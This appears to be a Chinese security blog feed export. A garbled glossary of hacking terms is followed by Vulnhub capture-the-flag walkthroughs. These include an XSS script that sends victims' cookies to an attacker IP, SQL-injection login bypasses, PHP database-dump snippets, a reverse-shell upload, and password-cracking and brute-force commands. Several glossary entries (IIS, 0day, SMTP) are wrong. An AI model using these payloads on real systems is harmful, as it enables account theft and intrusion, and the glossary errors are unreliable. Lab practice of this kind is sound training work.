Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</p><h3 id="cookie欺骗"><a href="#cookie欺骗" class="headerlink" title="cookie欺骗"></a><strong>cookie欺骗</strong></h3><p>&ensp;&ensp;&ensp;&ensp;现在有很多社区网为了方便网友浏览，都使用了cookie技术以避免多次输入密码（就如the9和vr），所以只要对服务器递交给用户的cookie进行改写就可以达到欺骗服务程序的目的。<br>&ensp;&ensp;&ensp;&ensp;COOKIE欺骗原理：按照浏览器的约定，只有来自同一域名的cookie才可以读写，而cookie只是浏览器的，对通讯协议无影响。</p><h3 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a><strong>上传漏洞</strong></h3><p>&ensp;&ensp;&ensp;&ensp;这个漏洞在DVBBS6.0时代被黑客们利用的最为猖獗，利用上传漏洞可以直接得到WEBSHELL，危害等级超级高，入侵中上传漏洞也是常见的漏洞。<br>&ensp;&ensp;&ensp;&ensp;导致该漏洞的原因在于代码作者没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。</p><h3 id="ARP攻击"><a href="#ARP攻击" class="headerlink" title="ARP攻击"></a><strong>ARP攻击</strong></h3><p>&ensp;&ensp;&ensp;&ensp;ARP（Address Resolution Protocol，地址解析协议）是一个位于TCP/IP协议栈中的网络层，负责将某个IP地址解析成对应的MAC地址。<br>&ensp;&ensp;&ensp;&ensp;ARP 病毒攻击是局域网最常见的一种攻击方式。由于TCP/IP协议存在的一些漏洞给ARP病毒有进行欺骗攻击的机会，ARP利用TCP/IP协议的漏洞进行欺骗攻击，现已严重影响到人们正常上网和通信安全。当局域网内的计算机遭到ARP的攻击时，它就会持续地向局域网内所有的计算机及网络通信设备发送大量的ARP欺骗数据包，如果不及时处理，便会造成网络通道阻塞、网络设备的承载过重、网络的通讯质量不佳等情况。</p><h3 id="暴库"><a href="#暴库" class="headerlink" title="暴库"></a><strong>暴库</strong></h3><p>&ensp;&ensp;&ensp;&ensp;暴库，就是通过一些技术手段或者程序漏洞得到数据库的地址，并将数据非法下载到本地。黑客非常乐意于这种工作，为什么呢？因为黑客在得到网站数据库后，就能得到网站管理账号，对网站进行破坏与管理，黑客也能通过数据库得到网站用户的隐私信息，甚至得到服务器的最高权限。</p><h3 id="网络钓鱼"><a href="#网络钓鱼" class="headerlink" title="网络钓鱼"></a><strong>网络钓鱼</strong></h3><p>&ensp;&ensp;&ensp;&ensp;网络钓鱼（Phishing，与钓鱼的英语fishing发音相近，又名钓鱼法或钓鱼式攻击）是通过大量发送声称来自于银行或其他知名机构的欺骗性垃圾邮件，意图引诱收信人给出敏感信息（如用户名、口令、帐号 ID 、 ATM PIN 码或信用卡详细信息）的一种攻击方式。</p><h3 id="蜜罐技术"><a href="#蜜罐技术" class="headerlink" title="蜜罐技术"></a><strong>蜜罐技术</strong></h3><p>&ensp;&ensp;&ensp;&ensp;蜜罐技术本质上是一种对攻击方进行欺骗的技术，通过布置一些作为诱饵的主机、网络服务或者信息，诱使攻击方对它们实施攻击，从而可以对攻击行为进行捕获和分析，了解攻击方所使用的工具与方法，推测攻击意图和动机，能够让防御方清晰地了解他们所面对的安全威胁，并通过技术和管理手段来增强实际系统的安全防护能力。<br>&ensp;&ensp;&ensp;&ensp;蜜罐好比是情报收集系统。蜜罐好像是故意让人攻击的目标，引诱黑客前来攻击。所以攻击者入侵后，你就可以知道他是如何得逞的，随时了解针对服务器发动的最新的攻击和漏洞。还可以通过窃听黑客之间的联系，收集黑客所用的种种工具，并且掌握他们的社交网络。</p><h3 id="拒绝服务攻击-DOS"><a href="#拒绝服务攻击-DOS" class="headerlink" title="拒绝服务攻击 DOS"></a><strong>拒绝服务攻击 DOS</strong></h3><p>&ensp;&ensp;&ensp;&ensp;拒绝服务攻击即是攻击者想办法让目标机器停止提供服务，是黑客常用的攻击手段之一。其实对网络带宽进行的消耗性攻击只是拒绝服务攻击的一小部分，只要能够对目标造成麻烦，使某些服务被暂停甚至主机死机，都属于拒绝服务攻击。拒绝服务攻击问题也一直得不到合理的解决，究其原因是因为网络协议本身的安全缺陷，从而拒绝服务攻击也成为了攻击者的终极手法。攻击者进行拒绝服务攻击，实际上让服务器实现两种效果：一是迫使服务器的缓冲区满，不接收新的请求；二是使用IP欺骗，迫使服务器把非法用户的连接复位，影响合法用户的连接。</p><h3 id="跳板"><a href="#跳板" class="headerlink" title="跳板"></a><strong>跳板</strong></h3><p>&ensp;&ensp;&ensp;&ensp;跳板，简单来说，就是为了隐藏自己的地址，让别人无法查找到自己的位置。</p><h3 id="旁注"><a href="#旁注" class="headerlink" title="旁注"></a><strong>旁注</strong></h3><p>&ensp;&ensp;&ensp;&ensp;旁注是一种入侵方法，在字面上解释就是－”从旁注入”，利用同一主机上面不同网站的漏洞得到webshell，从而利用主机上的程序或者是服务所暴露的用户所在的物理路径进行入侵。</p><h3 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a><strong>Telnet</strong></h3><p>&ensp;&ensp;&ensp;&ensp;Telnet协议是TCP/IP协议族中的一员，是Internet远程登录服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。要开始一个telnet会话，必须输入用户名和密码来登录服务器。Telnet是常用的远程控制Web服务器的方法。</p><h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a><strong>ftp</strong></h3><p>&ensp;&ensp;&ensp;&ensp;文件传输协议（File Transfer Protocol，FTP）是用于在网络上进行文件传输的一套标准协议，它工作在 OSI 模型的第七层， TCP 模型的第四层， 即应用层， 使用 TCP 传输而不是 UDP， 客户在和服务器建立连接前要经过一个“三次握手”的过程， 保证客户与服务器之间的连接是可靠的， 而且是面向连接， 为数据传输提供可靠保证。 [1]<br>&ensp;&ensp;&ensp;&ensp;FTP允许用户以文件操作的方式（如文件的增、删、改、查、传送等）与另一主机相互通信。然而， 用户并不真正登录到自己想要存取的计算机上面而成为完全用户， 可用FTP程序访问远程资源， 实现用户往返传输文件、目录管理以及访问电子邮件等等， 即使双方计算机可能配有不同的操作系统和文件存储方式。</p><h3 id="smtp"><a href="#smtp" class="headerlink" title="smtp"></a><strong>smtp</strong></h3><p>&ensp;&ensp;&ensp;&ensp;SMTP是一种提供可靠且有效的电子邮件传输的协议。SMTP是建立在FTP文件传输服务上的一种邮件服务，主要用于系统之间的邮件信息传递，并提供有关来信的通知。SMTP独立于特定的传输子系统，且只需要可靠有序的数据流信道支持，SMTP的重要特性之一是其能跨越网络传输邮件，即“SMTP邮件中继”。使用SMTP，可实现相同网络处理进程之间的邮件传输，也可通过中继器或网关实现某处理进程与其他网络之间的邮件传输。</p><h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a><strong>代理</strong></h3><p>&ensp;&ensp;&ensp;&ensp;代理服务器（Proxy Server）是一种重要的服务器安全功能，它的工作主要在开放系统互联(OSI)模型的会话层，从而起到防火墙的作用。代理服务器大多被用来连接INTERNET（国际互联网）和INTRANET（局域网）。<br>&ensp;&ensp;&ensp;&ensp;C#语言中，代理是指Delegate，也翻译为委托。C#中的delegate和C++中的函数指针基本是一回事，C#正是以delegate的形式实现了函数指针。不同的地方在于C#中delegate是类型安全的。<br>&ensp;&ensp;&ensp;&ensp;delegate仅仅关注涉及的方法（函数）的细节。它是一种类型，这种类型的变量可以用来赋值不同（但类似）的方法（函数）。说白了，即是将处理代码“放置”到变量中，“执行”这个变量，就是执行这个变量中“放置”的代码。</p><h3 id="iis"><a href="#iis" class="headerlink" title="iis"></a><strong>iis</strong></h3><p>&ensp;&ensp;&ensp;&ensp;”IIS”即(Internet Identity system)中文翻译为“互联网识别体系。”IIS”在人们日常的工作中，是指企业有意识，有计划地将自己企业的CI特征通过互联网向社会公众主动地展示与传播，使公众在互联网中对企业有一个可管理、符合企业传播规范的印象和认识，以便消费者更好地认知并留下良好的印象。</p><h3 id="0day"><a href="#0day" class="headerlink" title="0day"></a><strong>0day</strong></h3><p>&ensp;&ensp;&ensp;&ensp;0day泛指所有在官方发布该作品之前或者当天，这主要涵盖了影视、软件、游戏、音乐、资料等方面，由一些特别小组以一定的格式打包发布的数码内容。基本上每个0day发布作品中都包含了说明该发布作品的NFO文件，该文件主要包括发布小组的信息、发布作品的信息、破解信息等。nfo文件有专门的软件来查看，其实系统自带的记事本也可以查看。</p><h3 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a><strong>google hacking</strong></h3><p>&ensp;&ensp;&ensp;&ensp;Google Hacking的含义原指利用Google Google搜索引擎搜索信息来进行入侵的技术和行为；</p><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a><strong>exploit</strong></h3><p>&ensp;&ensp;&ensp;&ensp;Exploit 的英文意思就是利用，它在黑客眼里就是漏洞利用。有漏洞不一定就有Exploit（利用)，有Exploit就肯定有漏洞。</p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a><strong>XSS</strong></h3><p>&ensp;&ensp;&ensp;&ensp;跨站脚本攻击（也称为XSS）指利用网站漏洞从用户那里恶意盗取信息。</p><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a><strong>CSRF</strong></h3><p>&ensp;&ensp;&ensp;&ensp;跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</p><h3 id="嗅探"><a href="#嗅探" class="headerlink" title="嗅探"></a><strong>嗅探</strong></h3><p>&ensp;&ensp;&ensp;&ensp;一般指嗅探器。嗅探器 可以获取网络上流经的数据包。 用集线器hub组建的网络是基于共享的原理的， 局域网内所有的计算机都接收相同的数据包， 而网卡构造了硬件的“过滤器“ 通过识别MAC地址过滤掉和自己无关的信息， 嗅探程序只需关闭这个过滤器， 将网卡设置为“混杂模式“就可以进行嗅探 用交换机switch组建的网络是基于“交换“原理的 ，交换机不是把数据包发到所有的端口上， 而是发到目的网卡所在的端口。</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a><strong>提权</strong></h3><p>&ensp;&ensp;&ensp;&ensp;提高自己在服务器中的权限，主要针对网站入侵过程中，当入侵某一网站时，通过各种漏洞提升WEBSHELL权限以夺得该服务器权限。</p><h3 id="CGI-通用网关接口"><a href="#CGI-通用网关接口" class="headerlink" title="CGI 通用网关接口"></a><strong>CGI 通用网关接口</strong></h3><p>&ensp;&ensp;&ensp;&ensp;公共网关接口（Common Gateway Interface，CGI）是Web 服务器运行时外部程序的规范，按CGI 编写的程序可以扩展服务器功能。CGI 应用程序能与浏览器进行交互，还可通过数据API与数据库服务器等外部数据源进行通信，从数据库服务器中获取数据。格式化为HTML文档后，发送给浏览器，也可以将从浏览器获得的数据放到数据库中。几乎所有服务器都支持CGI，可用任何语言编写CGI，包括流行的C、C ++、Java、VB 和Delphi 等。CGI分为标准CGI和间接CGI两种。标准CGI使用命令行参数或环境变量表示服务器的详细请求，服务器与浏览器通信采用标准输入输出方式。间接CGI又称缓冲CGI，在CGI程序和CGI接口之间插入一个缓冲程序，缓冲程序与CGI接口间用标准输入输出进行通信。</p><h3 id="AMSI"><a href="#AMSI" class="headerlink" title="AMSI"></a><strong>AMSI</strong></h3><p>&ensp;&ensp;&ensp;&ensp;AMSI全称为“ANTI MALWARE SCAN INTERFACE”，即反恶意软件扫描接口。顾名思义，它要做的就是扫描，检测和阻止任何有害的东西。</p><h2 id="0x01-win常用常量"><a href="#0x01-win常用常量" class="headerlink" title="0x01 win常用常量"></a>0x01 win常用常量</h2><p><img src="/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%99%BE%E7%A7%91/1.png" alt></p><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol><li><a href="https://baike.baidu.com/" target="_blank" rel="noopener">百度百科</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub之Holynix-v1</title>
      <link href="/vulnhub%E4%B9%8BHolynix-v1/"/>
      <url>/vulnhub%E4%B9%8BHolynix-v1/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-Holynix-v1"><a href="#0x00-Holynix-v1" class="headerlink" title="0x00 Holynix: v1"></a>0x00 Holynix: v1</h2><ol><li><a href="https://www.vulnhub.com/entry/holynix-v1,20/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/holynix-v1,20/</a></li></ol><h2 id="0x01-Do"><a href="#0x01-Do" class="headerlink" title="0x01 Do"></a>0x01 Do</h2><ol><li>netdiscover扫描存活靶场的IP：192.168.100.12</li><li>nmap扫描端口</li><li><img src="/vulnhub%E4%B9%8BHolynix-v1/1.png" alt></li><li>访问80</li><li><img src="/vulnhub%E4%B9%8BHolynix-v1/2.png" alt></li><li>登录测试，输入单引号’</li><li><img src="/vulnhub%E4%B9%8BHolynix-v1/3.png" alt></li><li>显示sql错误信息</li><li><img src="/vulnhub%E4%B9%8BHolynix-v1/4.png" alt></li><li>抓包，让sqlmap跑注入</li><li><img src="/vulnhub%E4%B9%8BHolynix-v1/5.png" alt></li><li>跑数据库：sqlmap -r 1.txt –dbs –batch</li><li><img src="/vulnhub%E4%B9%8BHolynix-v1/6.png" alt></li><li>跑数据表：sqlmap -r 1.txt -D creds –tables –batch</li><li><img src="/vulnhub%E4%B9%8BHolynix-v1/7.png" alt></li><li>跑数据：sqlmap -r 1.txt -D creds -T accounts –dump –batch</li><li><img src="/vulnhub%E4%B9%8BHolynix-v1/8.png" alt></li></ol><h2 id="0x02-Login"><a href="#0x02-Login" class="headerlink" title="0x02 Login"></a>0x02 Login</h2><ol><li>使用账号密码登录，其实也可以使用万能账号密码登录：’ or 1=1#</li><li><img src="/vulnhub%E4%B9%8BHolynix-v1/9.png" alt></li><li>有upload功能，尝试上传1.txt，当前用户上传不了</li><li><img src="/vulnhub%E4%B9%8BHolynix-v1/10.png" alt></li><li>使用jjames、@rR35t3D@716登录</li><li><img src="/vulnhub%E4%B9%8BHolynix-v1/11.png" alt></li><li>再上传1.txt，上传成功，不过权限已更改</li><li><img src="/vulnhub%E4%B9%8BHolynix-v1/12.png" alt></li><li>但是找不到1.txt的真实路径，翻翻其他的，security功能</li><li><img src="/vulnhub%E4%B9%8BHolynix-v1/13.png" alt></li><li>抓包，查看到%2f，试试目录遍历漏洞</li><li><img src="/vulnhub%E4%B9%8BHolynix-v1/14.png" alt></li><li>然而并不是重点，继续查看上传的位置</li><li><img src="/vulnhub%E4%B9%8BHolynix-v1/15.png" alt></li><li><img src="/vulnhub%E4%B9%8BHolynix-v1/16.png" alt></li><li>tar -zcvf 1.tar.gz 1.txt </li><li><img src="/vulnhub%E4%B9%8BHolynix-v1/17.png" alt></li><li>上传1.tar.gz，上传了也没显示路径</li><li><img src="/vulnhub%E4%B9%8BHolynix-v1/18.png" alt></li><li><img src="/vulnhub%E4%B9%8BHolynix-v1/19.png" alt></li><li>重点是Home Directory Uploader</li><li><img src="/vulnhub%E4%B9%8BHolynix-v1/20.png" alt></li><li><img src="/vulnhub%E4%B9%8BHolynix-v1/21.png" alt></li><li>访问/jjames/</li><li><img src="/vulnhub%E4%B9%8BHolynix-v1/22.png" alt></li><li>访问/~jjames/</li><li><img src="/vulnhub%E4%B9%8BHolynix-v1/23.png" alt></li><li>利用不了~</li><li><img src="/vulnhub%E4%B9%8BHolynix-v1/24.png" alt></li><li>待续</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub之LAMPSecurity-CTF8</title>
      <link href="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/"/>
      <url>/vulnhub%E4%B9%8BLAMPSecurity-CTF8/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-LAMPSecurity-CTF8"><a href="#0x00-LAMPSecurity-CTF8" class="headerlink" title="0x00 LAMPSecurity: CTF8"></a>0x00 LAMPSecurity: CTF8</h2><ol><li><a href="https://www.vulnhub.com/entry/lampsecurity-ctf8,87/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/lampsecurity-ctf8,87/</a></li></ol><h2 id="0x01-Do"><a href="#0x01-Do" class="headerlink" title="0x01 Do"></a>0x01 Do</h2><ol><li><p>netdiscover发现靶场IP：192.168.100.25</p></li><li><p>nmap扫描</p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/1.png" alt></p></li><li><p>访问80，查看网页源代码，得#flag#550e1bafe077ff0b0b67f4e32f29d751</p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/2.png" alt></p></li><li><p>解MD5，得12345678</p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/3.png" alt></p></li><li><p>扫目录</p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/4.png" alt></p></li><li><p>访问phpinfo.php，得#flag#550e1bafe077ff0b0b67f4e32f29d751</p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/5.png" alt></p></li><li><p>继续翻，发现扫目录没扫出来的/content/目录</p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/6.png" alt></p></li><li><p>扫/content/目录</p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/7.png" alt></p></li><li><p>访问/hidden/</p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/8.png" alt></p></li><li><p>#flag#57dbe55b42b307fb4115146d239955d0，browarprezes</p></li><li><p>注册账号test1</p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/9.png" alt></p></li><li><p>添加XSS评论</p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/10.png" alt></p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/11.png" alt></p></li><li><p>利用XSS漏洞，编辑脚本获取其他人访问此页面的cookie</p><pre><code>&lt;script&gt;var request=new XMLHttpRequest();var redirect_url=&quot;http://192.168.100.4/&quot;+document.cookie; request.open(&quot;GET&quot;,redirect_url);request.send();&lt;/script&gt;</code></pre></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/12.png" alt></p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/13.png" alt></p></li><li><p>向作者发送此页面链接</p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/14.png" alt></p></li><li><p>kali搭建Python服务器：python -m SimpleHTTPServer 80，等待一阵子，获取到cookie</p></li><li><p>SESSc3668e8126622526d1312a9c75151240=ii0v52ppqfeglhsim843412d23;</p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/15.png" alt></p></li><li><p>开启burpsuite，返回主页/刷新主页/访问<a href="http://192.168.100.25/" target="_blank" rel="noopener">http://192.168.100.25/</a></p></li><li><p>替换cookie</p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/16.png" alt></p></li><li><p>已以Barbara身份登录了</p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/17.png" alt></p></li><li><p>然后每次都要更换cookie才能以Barbara身份操作，重新获取cookie</p></li><li><p>使用burpsuite自动替换</p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/18.png" alt></p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/19.png" alt></p></li><li><p>Barbara身份可以发布，前面扫描端口存在mysql，编辑脚本获取用户名与密码</p></li><li><p>列出数据库</p><pre><code>&lt;?php$result=db_query(&#39;show databases&#39;);while($record=db_fetch_object($result)){print $record-&gt;Database.&quot;&lt;br/&gt;&quot;;}?&gt;</code></pre></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/20.png" alt></p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/21.png" alt></p></li><li><p>另一种列出数据库</p><pre><code>&lt;?php$result=db_query(&#39;select schema_name from information_schema.schemata&#39;);while($record=db_fetch_object($result)){print $record-&gt;schema_name.&quot;&lt;br/&gt;&quot;;}?&gt;</code></pre></li><li><p>列表</p><pre><code>&lt;?php$result=db_query(&#39;select table_name from information_schema.tables where table_schema=0x666C6167&#39;);while($record=db_fetch_object($result)){print $record-&gt;table_name.&quot;&lt;br/&gt;&quot;;}?&gt;</code></pre></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/22.png" alt></p></li><li><p>列列</p><pre><code>&lt;?php$result=db_query(&#39;select column_name from information_schema.columns where table_schema=0x666C6167 and table_name=0x666C6167&#39;);while($record=db_fetch_object($result)){print $record-&gt;column_name.&quot;&lt;br/&gt;&quot;;}?&gt;</code></pre></li><li><p>列数据</p><pre><code>&lt;?php$result=db_query(&#39;select flag from flag.flag&#39;);while($record=db_fetch_object($result)){print $record-&gt;flag.&quot;&lt;br/&gt;&quot;;}?&gt;</code></pre></li><li><p>得#flag#ab38cd01f27d48e13bbef62890c4330e</p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/23.png" alt></p></li><li><p>一种列出所有用户名与密码</p><pre><code>&lt;?php$result=db_query(&#39;select name,pass from users&#39;);while($record=db_fetch_object($result)){print $record-&gt;name.&quot;:&quot;.$record-&gt;pass.&quot;&lt;br/&gt;&quot;;}?&gt;</code></pre></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/24.png" alt></p><pre><code>admin:49265c16d1dff8acef3499bd889299d6Barbara:bed128365216c019988915ed3add75fbJim:2a5de0f53b1317f7e36afcdb6b5202a4Steve:08d15a4aef553492d8971cdd5198f314Sherry:c3319d1016a802db86653bcfab871f4fGene:9b9e4bbd988954028a44710a50982576Harvey:7d29975b78825ea7c27f5c0281ea2fa4John:518462cd3292a67c755521c1fb50c909Johnathan:6dc523ebd2379d96cc0af32e2d224db0Susan:0d42223010b69cab86634bc359ed870bDan:8f75ad3f04fc42f07c95e2f3d0ec3503George:ed2b1f468c5f915f3f1cf75d7068baaeJeff:ca594f739e257245f2be69eb546c1c04Stacey:85aca385eb555fb6a36a62915ddd8bc7Juan:573152cc51de19df50e90b0e557db7feMichael:c7a4476fc64b75ead800da9ea2b7d072Jerome:42248d4cb640a3fb5836571e254aee2bTom:971dcf53e88e9268714d9d504753d347Xavier:3005d829eb819341357bfddf541c175bSally:7a1c07ff60f9c07ffe8da34ecbf4edc2test:098f6bcd4621d373cade4e832627b4f6test1:202cb962ac59075b964b07152d234b70</code></pre></li><li><p>保存到文件，使用john跑出来</p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/25.png" alt></p></li><li><p>john -w=/usr/share/wordlists/rockyou.txt -form=raw-md5 md5.txt </p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/26.png" alt></p></li><li><p>分开到用户字典、密码字典，hydra跑ssh账号密码，没跑出来</p></li><li><p>hydra IP PORT -L user.txt -P pass.txt -e ns -vV</p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/27.png" alt></p></li><li><p>medusa也没跑出来</p></li><li><p>medusa -M ssh -h 192.168.100.25 -U user.txt -P pass.txt</p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/28.png" alt></p></li><li><p>再看看用户名与Email，其实名字有第一部分首字母+第二部分名字</p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/29.png" alt></p></li><li><p>重新获取一下全部Email</p><pre><code>&lt;?php$result=db_query(&#39;select column_name from information_schema.columns where table_schema=0x64727570616C and table_name=0x7573657273&#39;);while($record=db_fetch_object($result)){print $record-&gt;column_name.&quot;&lt;br/&gt;&quot;;}?&gt;</code></pre><pre><code>&lt;?php$result=db_query(&#39;select mail from drupal.users&#39;);while($record=db_fetch_object($result)){print $record-&gt;mail.&quot;&lt;br/&gt;&quot;;}?&gt;</code></pre></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/30.png" alt></p><pre><code>bdio@localhostdhart@localhost.localdomaingconnor@localhost.localdomaingprune@localhost.localdomainhplink@localhost.localdomainjalderman@localhost.localdomainjgoldman@localhost.localdomainjgrimes@localhost.localdomainjharraway@localhostjingersol@localhost.localdomainjstone@localhost.localdomainmswanson@localhost.localdomainsholden@localhost.localdomainshunter@localhost.localdomainsloreman@localhost.localdomainspinkton@localhostspinkton@localhost.localdomainsswiney@localhost.localdomaintest@123.comtest@qq.comtmaloney@localhost.localdomainxbruce@localhost.localdomain</code></pre></li><li><p>hydra再跑一次</p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/31.png" alt></p></li><li><p>登录失败~</p></li><li><p>medusa再跑一次</p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/32.png" alt></p></li><li><p>ssh -oKexAlgorithms=diffie-hellman-group1-sha1 -oKexAlgorithms=diffie-hellman-group14-sha1 -oKexAlgorithms=diffie-hellman-group-exchange-sha1 <a href="mailto:jharraway@192.168.100.25" target="_blank" rel="noopener">jharraway@192.168.100.25</a></p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/33.png" alt></p></li><li><p>#flag#5e937c51b852e1ee90d42ddb5ccb8997</p></li><li><p>读flag文件</p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/34.png" alt></p></li><li><p>#flag#0ab251c07822d26b07b88136739ae39b</p></li><li><p>当前用户不在sudoers中</p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/35.png" alt></p></li><li><p>切换用户登录</p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/36.png" alt></p></li><li><p>当前用户也不在sudoers中</p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/37.png" alt></p></li><li><p>切换到admin对应的邮件用户登录ssh，#flag#0ab251c07822d26b07b88136739ae39b</p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/38.png" alt></p></li><li><p>还有个#flag#5b650c18929383074fea8870d857dd2e</p></li><li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/39.png" alt></p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub之LAMPSecurity-CTF7</title>
      <link href="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/"/>
      <url>/vulnhub%E4%B9%8BLAMPSecurity-CTF7/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-LAMPSecurity-CTF7"><a href="#0x00-LAMPSecurity-CTF7" class="headerlink" title="0x00 LAMPSecurity: CTF7"></a>0x00 LAMPSecurity: CTF7</h2><ol><li><a href="https://www.vulnhub.com/entry/lampsecurity-ctf7,86/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/lampsecurity-ctf7,86/</a></li></ol><h2 id="0x01-Do"><a href="#0x01-Do" class="headerlink" title="0x01 Do"></a>0x01 Do</h2><ol><li>netdiscover，得靶场IP：192.168.100.11</li><li>nmap扫描</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/1.png" alt></li><li>访问80、8080</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/2.png" alt></li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/3.png" alt></li><li>尝试单引号</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/4.png" alt></li><li>可万能密码绕过：’ or 1=1#</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/5.png" alt></li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/6.png" alt></li><li>随意翻翻，有上传文件功能</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/7.png" alt></li><li>上传php反弹shell脚本，修改IP与port</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/8.png" alt></li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/9.png" alt></li><li>上传成功</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/10.png" alt></li><li>怎样利用。。。。</li></ol><h2 id="0x02-Then"><a href="#0x02-Then" class="headerlink" title="0x02 Then"></a>0x02 Then</h2><ol><li>dirb扫目录</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/11.png" alt></li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/12.png" alt></li><li>nc开启监听，点击php-reverse-shell.php文件链接</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/13.png" alt></li></ol><h2 id="0x03-Test"><a href="#0x03-Test" class="headerlink" title="0x03 Test"></a>0x03 Test</h2><ol><li>获取的shell是非交互式的，先获取交互式shell，再无密码登录mysql</li><li>python -c ‘import pty; pty.spawn(“/bin/bash”)’</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/14.png" alt></li><li>获取用户名与密码，解密码e22f07b17f98e0d9d364584ced0e3c18</li><li><img 